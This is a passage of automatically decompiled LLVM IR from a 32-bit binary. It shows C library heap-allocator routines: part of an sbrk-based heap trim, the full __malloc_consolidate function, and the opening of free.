  %v1_804abe5 = add i32 %v0_804abdd, 860
  %v2_804abe5 = inttoptr i32 %v1_804abe5 to i32*
  %v3_804abe5 = load i32, i32* %v2_804abe5, align 4
  store i32 %v3_804abe5, i32* @ecx, align 4
  %v1_804abeb = add i32 %v0_804abdd, 44
  %v2_804abeb = inttoptr i32 %v1_804abeb to i32*
  %v3_804abeb = load i32, i32* %v2_804abeb, align 4
  %v1_804abee = add i32 %v3_804abeb, 4
  %v2_804abee = inttoptr i32 %v1_804abee to i32*
  %v3_804abee = load i32, i32* %v2_804abee, align 4
  %v1_804abf1 = and i32 %v3_804abee, -4
  store i32 %v1_804abf1, i32* @esi, align 4
  %v1_804abf6 = load i32, i32* @eax, align 4
  %v2_804abf6 = add i32 %v3_804abe5, -17
  %v2_804abf8 = add i32 %v2_804abf6, %v1_804abf1
  %v3_804abf8 = sub i32 %v2_804abf8, %v1_804abf6
  %div = udiv i32 %v3_804abf8, %v3_804abe5
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804abf8, %v3_804abe5
  store i32 %tmp10, i32* @edx, align 4
  %v1_804ac00 = add i32 %div, -1
  %v4_804ac03 = mul i32 %v1_804ac00, %v3_804abe5
  store i32 %v4_804ac03, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804ac03, 1
  br i1 %tmp11, label %dec_label_pc_804ac5f, label %dec_label_pc_804ac0a

dec_label_pc_804ac0a:                             ; preds = %entry
  %v1_804ac0f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804ac0f, i32* %edi.global-to-local, align 4
  %v0_804ac19 = load i32, i32* @esi, align 4
  store i32 %v0_804ac19, i32* %eax.global-to-local, align 4
  %v1_804ac1b = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ac1b = add i32 %v1_804ac1b, 44
  %v3_804ac1b = inttoptr i32 %v2_804ac1b to i32*
  %v4_804ac1b = load i32, i32* %v3_804ac1b, align 4
  %v5_804ac1b = add i32 %v4_804ac1b, %v0_804ac19
  store i32 %v5_804ac1b, i32* %eax.global-to-local, align 4
  %v12_804ac1e = icmp eq i32 %v1_804ac0f, %v5_804ac1b
  %v1_804ac20 = icmp eq i1 %v12_804ac1e, false
  br i1 %v1_804ac20, label %dec_label_pc_804ac5f, label %dec_label_pc_804ac22

dec_label_pc_804ac22:                             ; preds = %dec_label_pc_804ac0a
  %v1_804ac25 = sub i32 0, %v4_804ac03
  store i32 %v1_804ac25, i32* @ebx, align 4
  %v1_804ac28 = call i32 @__GI_sbrk(i32 %v1_804ac25)
  store i32 %v1_804ac28, i32* %eax.global-to-local, align 4
  %v1_804ac34 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804ac34, i32* %eax.global-to-local, align 4
  %v10_804ac3c = icmp eq i32 %v1_804ac34, -1
  br i1 %v10_804ac3c, label %dec_label_pc_804ac5f, label %dec_label_pc_804ac41

dec_label_pc_804ac41:                             ; preds = %dec_label_pc_804ac22
  %v0_804ac41 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ac43 = sub i32 %v0_804ac41, %v1_804ac34
  %v12_804ac43 = icmp eq i32 %v2_804ac43, 0
  store i32 %v2_804ac43, i32* @ecx, align 4
  br i1 %v12_804ac43, label %dec_label_pc_804ac5f, label %dec_label_pc_804ac47

dec_label_pc_804ac47:                             ; preds = %dec_label_pc_804ac41
  %v0_804ac47 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ac47 = add i32 %v0_804ac47, 44
  %v2_804ac47 = inttoptr i32 %v1_804ac47 to i32*
  %v3_804ac47 = load i32, i32* %v2_804ac47, align 4
  store i32 %v3_804ac47, i32* %eax.global-to-local, align 4
  %v0_804ac4a = load i32, i32* @esi, align 4
  %v2_804ac4a = sub i32 %v0_804ac4a, %v2_804ac43
  store i32 %v2_804ac4a, i32* %esi.global-to-local, align 4
  %v1_804ac4c = add i32 %v0_804ac47, 872
  %v2_804ac4c = inttoptr i32 %v1_804ac4c to i32*
  %v3_804ac4c = load i32, i32* %v2_804ac4c, align 4
  %v5_804ac4c = sub i32 %v3_804ac4c, %v2_804ac43
  store i32 %v5_804ac4c, i32* %v2_804ac4c, align 4
  %v0_804ac52 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ac52 = or i32 %v0_804ac52, 1
  store i32 %v1_804ac52, i32* %esi.global-to-local, align 4
  %v1_804ac55 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ac55 = add i32 %v1_804ac55, 4
  %v3_804ac55 = inttoptr i32 %v2_804ac55 to i32*
  store i32 %v1_804ac52, i32* %v3_804ac55, align 4
  br label %dec_label_pc_804ac61

dec_label_pc_804ac5f:                             ; preds = %dec_label_pc_804ac41, %dec_label_pc_804ac22, %dec_label_pc_804ac0a, %entry
  br label %dec_label_pc_804ac61

dec_label_pc_804ac61:                             ; preds = %dec_label_pc_804ac47, %dec_label_pc_804ac5f
  %storemerge = phi i32 [ 1, %dec_label_pc_804ac47 ], [ 0, %dec_label_pc_804ac5f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804abe0, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ac34, { 1, 0, 2 }
  uselistorder i32 %v4_804ac03, { 1, 2, 0 }
  uselistorder i32 %v3_804abe5, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804abdd, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804ac61, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804ac6a = load i32, i32* @edi, align 4
  %v0_804ac6b = load i32, i32* @esi, align 4
  %v0_804ac6c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804ac74 = load i32, i32* %arg1, align 4
  store i32 %v2_804ac74, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804ac7b = icmp eq i32 %v2_804ac74, 0
  br i1 %v1_804ac7b, label %dec_label_pc_804ada4.preheader, label %dec_label_pc_804ac83

dec_label_pc_804ada4.preheader:                   ; preds = %entry
  %v3_804ad99 = add i32 %tmp11, 44
  br label %dec_label_pc_804ad95

dec_label_pc_804ac83:                             ; preds = %entry
  %v1_804ac87 = and i32 %v2_804ac74, -3
  store i32 %v1_804ac87, i32* %arg1, align 4
  %v1_804ac8c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804ac9b = add i32 %tmp11, 4
  store i32 %v1_804ac9b, i32* %eax.global-to-local, align 4
  %v2_804aca2 = load i32, i32* %arg1, align 4
  %v2_804aca8 = udiv i32 %v2_804aca2, 8
  %v2_804acab = mul nuw i32 %v2_804aca8, 4
  %v3_804acab = add i32 %tmp11, -4
  %v4_804acab = add i32 %v3_804acab, %v2_804acab
  store i32 %v4_804acab, i32* %eax.global-to-local, align 4
  %v2_804ad72 = add i32 %tmp11, 44
  %v3_804ad72 = inttoptr i32 %v2_804ad72 to i32*
  %v1_804ad45 = add i32 %tmp11, 60
  %v2_804ad45 = inttoptr i32 %v1_804ad45 to i32*
  br label %dec_label_pc_804acb3

dec_label_pc_804acb3:                             ; preds = %dec_label_pc_804ad8b, %dec_label_pc_804ac83
  %v0_804acc1 = phi i32 [ %v1_804ac9b, %dec_label_pc_804ac83 ], [ %v4_804ad8b, %dec_label_pc_804ad8b ]
  store i32 %v0_804acc1, i32* %eax.global-to-local, align 4
  %v1_804acb7 = inttoptr i32 %v0_804acc1 to i32*
  %v2_804acb7 = load i32, i32* %v1_804acb7, align 4
  store i32 %v2_804acb7, i32* @ecx, align 4
  %v1_804acb9 = icmp eq i32 %v2_804acb7, 0
  br i1 %v1_804acb9, label %dec_label_pc_804ad81, label %dec_label_pc_804acc1

dec_label_pc_804acc1:                             ; preds = %dec_label_pc_804acb3
  store i32 0, i32* %v1_804acb7, align 4
  %v0_804acc7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804acc7

dec_label_pc_804acc7:                             ; preds = %dec_label_pc_804ad75, %dec_label_pc_804acc1
  %v0_804ace4 = phi i32 [ %v3_804acc7, %dec_label_pc_804ad75 ], [ %v0_804acc7.pre, %dec_label_pc_804acc1 ]
  %v1_804acc7 = add i32 %v0_804ace4, 8
  %v2_804acc7 = inttoptr i32 %v1_804acc7 to i32*
  %v3_804acc7 = load i32, i32* %v2_804acc7, align 4
  store i32 %v3_804acc7, i32* %edx.global-to-local, align 4
  %v1_804acce = add i32 %v0_804ace4, 4
  %v2_804acce = inttoptr i32 %v1_804acce to i32*
  %v3_804acce = load i32, i32* %v2_804acce, align 4
  store i32 %v3_804acce, i32* %eax.global-to-local, align 4
  %v1_804acd3 = and i32 %v3_804acce, -2
  store i32 %v1_804acd3, i32* @edi, align 4
  %v2_804acd6 = urem i32 %v3_804acce, 2
  %v3_804acd6 = icmp eq i32 %v2_804acd6, 0
  %v2_804acd8 = add i32 %v1_804acd3, %v0_804ace4
  store i32 %v2_804acd8, i32* @ebx, align 4
  %v1_804acdb = add i32 %v2_804acd8, 4
  %v2_804acdb = inttoptr i32 %v1_804acdb to i32*
  %v3_804acdb = load i32, i32* %v2_804acdb, align 4
  store i32 %v3_804acdb, i32* %edx.global-to-local, align 4
  %v1_804ace2 = icmp eq i1 %v3_804acd6, false
  br i1 %v1_804ace2, label %dec_label_pc_804ad04, label %dec_label_pc_804ace4

dec_label_pc_804ace4:                             ; preds = %dec_label_pc_804acc7
  %v1_804ace4 = inttoptr i32 %v0_804ace4 to i32*
  %v2_804ace4 = load i32, i32* %v1_804ace4, align 4
  store i32 %v2_804ace4, i32* %ebp.global-to-local, align 4
  %v2_804ace8 = sub i32 %v0_804ace4, %v2_804ace4
  store i32 %v2_804ace8, i32* %eax.global-to-local, align 4
  %v1_804acea = add i32 %v2_804ace8, 8
  %v2_804acea = inttoptr i32 %v1_804acea to i32*
  %v3_804acea = load i32, i32* %v2_804acea, align 4
  store i32 %v3_804acea, i32* @esi, align 4
  %v1_804aced = add i32 %v2_804ace8, 12
  %v2_804aced = inttoptr i32 %v1_804aced to i32*
  %v3_804aced = load i32, i32* %v2_804aced, align 4
  store i32 %v3_804aced, i32* %edx.global-to-local, align 4
  %v1_804acf0 = add i32 %v3_804acea, 12
  %v2_804acf0 = inttoptr i32 %v1_804acf0 to i32*
  %v3_804acf0 = load i32, i32* %v2_804acf0, align 4
  store i32 %v3_804acf0, i32* @ecx, align 4
  %v12_804acf3 = icmp eq i32 %v3_804acf0, %v2_804ace8
  %v1_804acf5 = icmp eq i1 %v12_804acf3, false
  br i1 %v1_804acf5, label %dec_label_pc_804ad34, label %dec_label_pc_804acf7

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804ace4
  %v1_804acf7 = add i32 %v3_804aced, 8
  %v2_804acf7 = inttoptr i32 %v1_804acf7 to i32*
  %v3_804acf7 = load i32, i32* %v2_804acf7, align 4
  %v15_804acf7 = icmp eq i32 %v3_804acf7, %v3_804acf0
  %v1_804acfa = icmp eq i1 %v15_804acf7, false
  br i1 %v1_804acfa, label %dec_label_pc_804ad34, label %dec_label_pc_804acfc

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804acf7
  %v2_804acfc = add i32 %v2_804ace4, %v1_804acd3
  store i32 %v2_804acfc, i32* @edi, align 4
  store i32 %v3_804aced, i32* %v2_804acf0, align 4
  %v0_804ad01 = load i32, i32* @esi, align 4
  %v1_804ad01 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ad01 = add i32 %v1_804ad01, 8
  %v3_804ad01 = inttoptr i32 %v2_804ad01 to i32*
  store i32 %v0_804ad01, i32* %v3_804ad01, align 4
  %v0_804ad0f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ad04

dec_label_pc_804ad04:                             ; preds = %dec_label_pc_804acc7, %dec_label_pc_804acfc
  %v1_804ad18 = phi i32 [ %v2_804acd8, %dec_label_pc_804acc7 ], [ %v0_804ad0f.pre, %dec_label_pc_804acfc ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ad0c = and i32 %v3_804acdb, -4
  store i32 %v1_804ad0c, i32* %ebp.global-to-local, align 4
  %v4_804ad0f = load i32, i32* %v3_804ad72, align 4
  %v15_804ad0f = icmp eq i32 %v1_804ad18, %v4_804ad0f
  br i1 %v15_804ad0f, label %dec_label_pc_804ad65, label %dec_label_pc_804ad14

dec_label_pc_804ad14:                             ; preds = %dec_label_pc_804ad04
  %v2_804ad14 = add i32 %v1_804ad18, 4
  %v3_804ad14 = add i32 %v2_804ad14, %v1_804ad0c
  %v4_804ad14 = inttoptr i32 %v3_804ad14 to i32*
  %v5_804ad14 = load i32, i32* %v4_804ad14, align 4
  store i32 %v5_804ad14, i32* %eax.global-to-local, align 4
  %v3_804ad18 = inttoptr i32 %v2_804ad14 to i32*
  store i32 %v1_804ad0c, i32* %v3_804ad18, align 4
  %v0_804ad1b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad1b = urem i32 %v0_804ad1b, 2
  %v2_804ad1b = icmp eq i32 %v1_804ad1b, 0
  store i32 %v1_804ad1b, i32* %eax.global-to-local, align 4
  %v1_804ad20 = icmp eq i1 %v2_804ad1b, false
  br i1 %v1_804ad20, label %dec_label_pc_804ad41, label %dec_label_pc_804ad22

dec_label_pc_804ad22:                             ; preds = %dec_label_pc_804ad14
  %v0_804ad22 = load i32, i32* @ebx, align 4
  %v1_804ad22 = add i32 %v0_804ad22, 8
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  %v3_804ad22 = load i32, i32* %v2_804ad22, align 4
  store i32 %v3_804ad22, i32* @edx, align 4
  %v1_804ad25 = add i32 %v0_804ad22, 12
  %v2_804ad25 = inttoptr i32 %v1_804ad25 to i32*
  %v3_804ad25 = load i32, i32* %v2_804ad25, align 4
  store i32 %v3_804ad25, i32* %eax.global-to-local, align 4
  %v1_804ad28 = add i32 %v3_804ad22, 12
  %v2_804ad28 = inttoptr i32 %v1_804ad28 to i32*
  %v3_804ad28 = load i32, i32* %v2_804ad28, align 4
  store i32 %v3_804ad28, i32* @esi, align 4
  %v12_804ad2b = icmp eq i32 %v3_804ad28, %v0_804ad22
  %v1_804ad2d = icmp eq i1 %v12_804ad2b, false
  br i1 %v1_804ad2d, label %dec_label_pc_804ad34, label %dec_label_pc_804ad2f

dec_label_pc_804ad2f:                             ; preds = %dec_label_pc_804ad22
  %v1_804ad2f = add i32 %v3_804ad25, 8
  %v2_804ad2f = inttoptr i32 %v1_804ad2f to i32*
  %v3_804ad2f = load i32, i32* %v2_804ad2f, align 4
  %v15_804ad2f = icmp eq i32 %v3_804ad2f, %v3_804ad28
  br i1 %v15_804ad2f, label %dec_label_pc_804ad39, label %dec_label_pc_804ad34

dec_label_pc_804ad34:                             ; preds = %dec_label_pc_804ad2f, %dec_label_pc_804ad22, %dec_label_pc_804acf7, %dec_label_pc_804ace4
  %v0_804ad34 = call i32 @abort()
  store i32 %v0_804ad34, i32* %eax.global-to-local, align 4
  %v1_804ad3b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad39

dec_label_pc_804ad39:                             ; preds = %dec_label_pc_804ad2f, %dec_label_pc_804ad34
  %v1_804ad3b = phi i32 [ %v3_804ad22, %dec_label_pc_804ad2f ], [ %v1_804ad3b.pre, %dec_label_pc_804ad34 ]
  %v0_804ad3b = phi i32 [ %v3_804ad25, %dec_label_pc_804ad2f ], [ %v0_804ad34, %dec_label_pc_804ad34 ]
  %v0_804ad39 = load i32, i32* @edi, align 4
  %v1_804ad39 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ad39 = add i32 %v1_804ad39, %v0_804ad39
  store i32 %v2_804ad39, i32* @edi, align 4
  %v2_804ad3b = add i32 %v1_804ad3b, 12
  %v3_804ad3b = inttoptr i32 %v2_804ad3b to i32*
  store i32 %v0_804ad3b, i32* %v3_804ad3b, align 4
  %v0_804ad3e = load i32, i32* @edx, align 4
  %v1_804ad3e = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad3e = add i32 %v1_804ad3e, 8
  %v3_804ad3e = inttoptr i32 %v2_804ad3e to i32*
  store i32 %v0_804ad3e, i32* %v3_804ad3e, align 4
  br label %dec_label_pc_804ad41

dec_label_pc_804ad41:                             ; preds = %dec_label_pc_804ad14, %dec_label_pc_804ad39
  store i32 %v1_804ac8c, i32* %eax.global-to-local, align 4
  %v3_804ad45 = load i32, i32* %v2_804ad45, align 4
  store i32 %v3_804ad45, i32* @edx, align 4
  %v0_804ad48 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad48, i32* %v2_804ad45, align 4
  %v0_804ad4b = load i32, i32* @edi, align 4
  %v1_804ad4d = or i32 %v0_804ad4b, 1
  %v1_804ad50 = load i32, i32* @ecx, align 4
  %v2_804ad50 = add i32 %v1_804ad50, 4
  %v3_804ad50 = inttoptr i32 %v2_804ad50 to i32*
  store i32 %v1_804ad4d, i32* %v3_804ad50, align 4
  %v0_804ad53 = load i32, i32* @ecx, align 4
  %v1_804ad53 = load i32, i32* @edx, align 4
  %v2_804ad53 = add i32 %v1_804ad53, 12
  %v3_804ad53 = inttoptr i32 %v2_804ad53 to i32*
  store i32 %v0_804ad53, i32* %v3_804ad53, align 4
  store i32 %v1_804ac8c, i32* %eax.global-to-local, align 4
  %v0_804ad5a = load i32, i32* @edx, align 4
  %v1_804ad5a = load i32, i32* @ecx, align 4
  %v2_804ad5a = add i32 %v1_804ad5a, 8
  %v3_804ad5a = inttoptr i32 %v2_804ad5a to i32*
  store i32 %v0_804ad5a, i32* %v3_804ad5a, align 4
  %v0_804ad5d = load i32, i32* @edi, align 4
  %v1_804ad5d = load i32, i32* @ecx, align 4
  %v3_804ad5d = add i32 %v1_804ad5d, %v0_804ad5d
  %v4_804ad5d = inttoptr i32 %v3_804ad5d to i32*
  store i32 %v0_804ad5d, i32* %v4_804ad5d, align 4
  %v0_804ad60 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad60 = load i32, i32* @ecx, align 4
  %v2_804ad60 = add i32 %v1_804ad60, 12
  %v3_804ad60 = inttoptr i32 %v2_804ad60 to i32*
  store i32 %v0_804ad60, i32* %v3_804ad60, align 4
  br label %dec_label_pc_804ad75

dec_label_pc_804ad65:                             ; preds = %dec_label_pc_804ad04
  %v0_804ad65 = load i32, i32* @edi, align 4
  %v2_804ad65 = add i32 %v0_804ad65, %v1_804ad0c
  %v1_804ad68 = or i32 %v2_804ad65, 1
  store i32 %v1_804ad68, i32* %eax.global-to-local, align 4
  %v1_804ad6b = load i32, i32* @ecx, align 4
  %v2_804ad6b = add i32 %v1_804ad6b, 4
  %v3_804ad6b = inttoptr i32 %v2_804ad6b to i32*
  store i32 %v1_804ad68, i32* %v3_804ad6b, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804ad72 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad72, i32* %v3_804ad72, align 4
  br label %dec_label_pc_804ad75

dec_label_pc_804ad75:                             ; preds = %dec_label_pc_804ad41, %dec_label_pc_804ad65
  store i32 %v3_804acc7, i32* @ecx, align 4
  %v1_804ad79 = icmp eq i32 %v3_804acc7, 0
  %v1_804ad7b = icmp eq i1 %v1_804ad79, false
  br i1 %v1_804ad7b, label %dec_label_pc_804acc7, label %dec_label_pc_804ad81

dec_label_pc_804ad81:                             ; preds = %dec_label_pc_804ad75, %dec_label_pc_804acb3
  store i32 %v4_804acab, i32* @ecx, align 4
  %v15_804ad85 = icmp eq i32 %v0_804acc1, %v4_804acab
  br i1 %v15_804ad85, label %dec_label_pc_804ae09, label %dec_label_pc_804ad8b

dec_label_pc_804ad8b:                             ; preds = %dec_label_pc_804ad81
  %v4_804ad8b = add i32 %v0_804acc1, 4
  br label %dec_label_pc_804acb3

dec_label_pc_804ad95:                             ; preds = %dec_label_pc_804ada4.preheader, %dec_label_pc_804ad95
  %v1_804ad9920 = phi i32 [ 1, %dec_label_pc_804ada4.preheader ], [ %v0_804ada4.pre, %dec_label_pc_804ad95 ]
  %v2_804ad99 = mul i32 %v1_804ad9920, 8
  %v4_804ad99 = add i32 %v3_804ad99, %v2_804ad99
  store i32 %v4_804ad99, i32* %eax.global-to-local, align 4
  %v1_804ad9d = add i32 %v1_804ad9920, 1
  store i32 %v1_804ad9d, i32* %edx.global-to-local, align 4
  %v2_804ad9e = add i32 %v4_804ad99, 12
  %v3_804ad9e = inttoptr i32 %v2_804ad9e to i32*
  store i32 %v4_804ad99, i32* %v3_804ad9e, align 4
  %v0_804ada1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ada1 = add i32 %v0_804ada1, 8
  %v3_804ada1 = inttoptr i32 %v2_804ada1 to i32*
  store i32 %v0_804ada1, i32* %v3_804ada1, align 4
  %v0_804ada4.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804ada7 = icmp sgt i32 %v0_804ada4.pre, 95
  br i1 %v7_804ada7, label %dec_label_pc_804ada9, label %dec_label_pc_804ad95

dec_label_pc_804ada9:                             ; preds = %dec_label_pc_804ad95
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804adad = add i32 %tmp11, 864
  %v2_804adad = inttoptr i32 %v1_804adad to i32*
  %v3_804adad = load i32, i32* %v2_804adad, align 4
  %v4_804adad = or i32 %v3_804adad, 1
  store i32 %v4_804adad, i32* %v2_804adad, align 4
  %v0_804adb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804adb4 = add i32 %v0_804adb4, 840
  %v2_804adb4 = inttoptr i32 %v1_804adb4 to i32*
  store i32 0, i32* %v2_804adb4, align 4
  %v0_804adbe = load i32, i32* %eax.global-to-local, align 4
  %v1_804adbe = add i32 %v0_804adbe, 852
  %v2_804adbe = inttoptr i32 %v1_804adbe to i32*
  store i32 65536, i32* %v2_804adbe, align 4
  %v0_804adc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804adc8 = add i32 %v0_804adc8, 844
  %v2_804adc8 = inttoptr i32 %v1_804adc8 to i32*
  store i32 262144, i32* %v2_804adc8, align 4
  %v0_804add2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804add2 = add i32 %v0_804add2, 836
  %v2_804add2 = inttoptr i32 %v1_804add2 to i32*
  store i32 262144, i32* %v2_804add2, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804ade3 = load i32, i32* %arg1, align 4
  %v1_804ade5 = urem i32 %v2_804ade3, 4
  %v1_804ade8 = or i32 %v1_804ade5, 72
  store i32 %v1_804ade8, i32* %arg1, align 4
  %v0_804aded = load i32, i32* @edx, align 4
  %v1_804adef = add i32 %v0_804aded, 52
  store i32 %v1_804adef, i32* %eax.global-to-local, align 4
  %v2_804adf2 = add i32 %v0_804aded, 44
  %v3_804adf2 = inttoptr i32 %v2_804adf2 to i32*
  store i32 %v1_804adef, i32* %v3_804adf2, align 4
  %v1_804adf7 = call i32 @sysconf(i32 30)
  store i32 %v1_804adf7, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804ae03 = add i32 %tmp11, 860
  %v3_804ae03 = inttoptr i32 %v2_804ae03 to i32*
  store i32 %v1_804adf7, i32* %v3_804ae03, align 4
  br label %dec_label_pc_804ae09

dec_label_pc_804ae09:                             ; preds = %dec_label_pc_804ad81, %dec_label_pc_804ada9
  store i32 %v0_804ac6c, i32* @ebx, align 4
  store i32 %v0_804ac6b, i32* @esi, align 4
  store i32 %v0_804ac6a, i32* @edi, align 4
  %v0_804ae10 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ae10

; uselistorder directives
  uselistorder i32 %v0_804ada1, { 1, 0 }
  uselistorder i32 %v0_804ad5d, { 1, 0 }
  uselistorder i32 %v1_804ad1b, { 1, 0 }
  uselistorder i32 %v2_804ad14, { 1, 0 }
  uselistorder i32 %v1_804ad0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ad18, { 1, 0 }
  uselistorder i32 %v3_804acc7, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804ace4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804acc1, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804ad72, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804ae09, { 1, 0 }
  uselistorder label %dec_label_pc_804ad95, { 1, 0 }
  uselistorder label %dec_label_pc_804ad75, { 1, 0 }
  uselistorder label %dec_label_pc_804ad41, { 1, 0 }
  uselistorder label %dec_label_pc_804ad39, { 1, 0 }
  uselistorder label %dec_label_pc_804ad04, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ae11 = load i32, i32* @ebp, align 4
  %v0_804ae12 = load i32, i32* @edi, align 4
  %v0_804ae13 = load i32, i32* @esi, align 4
  %v0_804ae14 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ae1c = icmp eq i32 %arg1, 0
  br i1 %v1_804ae1c, label %dec_label_pc_804afa5, label %dec_label_pc_804ae24

dec_label_pc_804ae24:                             ; preds = %entry
  %v2_804ae2f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ae2f, i32* @eax, align 4
  %v2_804ae34 = call i32 @__pthread_return_void(i32 %v2_804ae2f, i32 134526883)
  store i32 %v2_804ae34, i32* %eax.global-to-local, align 4
  %v1_804ae40 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  %v1_804ae45 = add i32 %arg1, -8
  store i32 %v1_804ae45, i32* @ecx, align 4
  %v0_804ae48 = load i8, i8* @global_var_8054600.37, align 1
  %v1_804ae48 = sext i8 %v0_804ae48 to i32
  store i32 %v1_804ae48, i32* %eax.global-to-local, align 4
  %v1_804ae4d = add i32 %arg1, -4
  %v2_804ae4d = inttoptr i32 %v1_804ae4d to i32*
  %v3_804ae4d = load i32, i32* %v2_804ae4d, align 4
  store i32 %v3_804ae4d, i32* @edx, align 4
  %v1_804ae55 = and i32 %v3_804ae4d, -4
  %v4_804ae55 = trunc i32 %v1_804ae55 to i8
  store i32 %v1_804ae55, i32* @ebx, align 4
  %v8_804ae5a = icmp ugt i8 %v4_804ae55, %v0_804ae48
  br i1 %v8_804ae5a, label %dec_label_pc_804ae7c, label %dec_label_pc_804ae5c

dec_label_pc_804ae5c:                             ; preds = %dec_label_pc_804ae24
  %v1_804ae5c = or i32 %v1_804ae48, 3
  %v3_804ae5c = trunc i32 %v1_804ae5c to i8
  store i32 %v1_804ae5c, i32* %eax.global-to-local, align 4
  %v2_804ae5f = udiv i32 %v3_804ae4d, 8
  store i8 %v3_804ae5c, i8* @global_var_8054600.37, align 512
  %v1_804ae67 = mul nuw i32 %v2_804ae5f, 4
  %v2_804ae67 = add i32 %v1_804ae67, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v2_804ae67, i32* @edx, align 4
  %v1_804ae6e = add i32 %v1_804ae67, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804ae6e = inttoptr i32 %v1_804ae6e to i32*
  %v3_804ae6e = load i32, i32* %v2_804ae6e, align 4
  store i32 %v3_804ae6e, i32* %eax.global-to-local, align 4
  %v3_804ae71 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804ae6e, i32* %v3_804ae71, align 4
  %v0_804ae74 = load i32, i32* @ecx, align 4
  %v1_804ae74 = load i32, i32* @edx, align 4
  %v2_804ae74 = add i32 %v1_804ae74, -4
  %v3_804ae74 = inttoptr i32 %v2_804ae74 to i32*
  store i32 %v0_804ae74, i32* %v3_804ae74, align 4
  br label %dec_label_pc_804af94

dec_label_pc_804ae7c:                             ; preds = %dec_label_pc_804ae24
  %v2_804ae7c = and i32 %v3_804ae4d, 2
  %v3_804ae7c = icmp eq i32 %v2_804ae7c, 0
  %v1_804ae7f = icmp eq i1 %v3_804ae7c, false
  br i1 %v1_804ae7f, label %dec_label_pc_804af74, label %dec_label_pc_804ae85

dec_label_pc_804ae85:                             ; preds = %dec_label_pc_804ae7c
  %v1_804ae85 = or i32 %v1_804ae48, 1
  %v3_804ae85 = trunc i32 %v1_804ae85 to i8
  store i32 %v1_804ae85, i32* %eax.global-to-local, align 4
  store i8 %v3_804ae85, i8* @global_var_8054600.37, align 512
  %v2_804ae8d = add i32 %v1_804ae55, %v1_804ae45
  store i32 %v2_804ae8d, i32* @esi, align 4
  %v1_804ae90 = add i32 %v2_804ae8d, 4
  %v2_804ae90 = inttoptr i32 %v1_804ae90 to i32*
  %v3_804ae90 = load i32, i32* %v2_804ae90, align 4
  store i32 %v3_804ae90, i32* %eax.global-to-local, align 4
  %v2_804ae97 = inttoptr i32 %v1_804ae4d to i8*
  %v3_804ae97 = load i8, i8* %v2_804ae97, align 1
  %v4_804ae97 = urem i8 %v3_804ae97, 2
  %v5_804ae97 = icmp eq i8 %v4_804ae97, 0
  %v1_804ae9b = icmp eq i1 %v5_804ae97, false
